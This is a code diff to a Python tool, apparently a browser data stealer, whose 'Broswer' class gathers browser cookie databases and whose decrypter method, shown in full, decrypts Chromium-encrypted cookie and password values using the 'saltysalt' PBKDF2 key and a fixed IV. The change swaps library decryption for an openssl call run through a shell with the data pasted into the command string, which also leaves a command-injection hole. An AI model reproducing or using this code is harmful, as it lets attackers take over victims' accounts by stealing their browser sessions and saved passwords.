@@ -16,8 +16,6 @@ import sqlite3
 import string
 import sys
 import tempfile
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
 
 DEBUG = True
 
@@ -96,25 +94,25 @@ class Broswer:
                 self.cookies_path.append({browser_name: cookies_data})
 
     def decrypter(self, cipher_text, key):
-        # Декодируем ключ из base64
-        key = base64.b64decode(key)
 
-        # Генерируем ключ с помощью PBKDF2-HMAC-SHA1
+        #print_debug(f"[+] decrypting {cipher_text} and  key is {key}")
+        cipher_text_encoded = base64.b64encode(cipher_text[3:])
+        iv = ''.join(('20', '20', '20', '20', '20', '20', '20', '20', '20', '20',
+                         '20', '20', '20', '20', '20', '20'))
+        key = key.encode("utf-8")
         key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003)[:16]
+        key = binascii.hexlify(key)
 
-        # Инициализационный вектор (IV)
-        iv = b'\x20' * 16
+        try:
+            cmd = f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K {key.decode('utf-8')} <<< {cipher_text_encoded.decode('utf-8')} 2>/dev/null"
+            #print_debug(f"cmd={cmd}")
+            output = subprocess.check_output(cmd, shell=True)
+        except Exception as e:
+            print(f"[-] Error running the openssl command: {e}")
+            output = cipher_text
 
-        # Создаем объект шифра
-        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
-
-        # Создаем дешифратор
-        decryptor = cipher.decryptor()
-
-        # Дешифруем данные
-        decrypted_data = decryptor.update(cipher_text[3:]) + decryptor.finalize()
-
-        return decrypted_data.decode("utf-8")
+        print(output)
+        return output
 
               
     def browse_browser_db(self, browser_data_paths, query_type): 
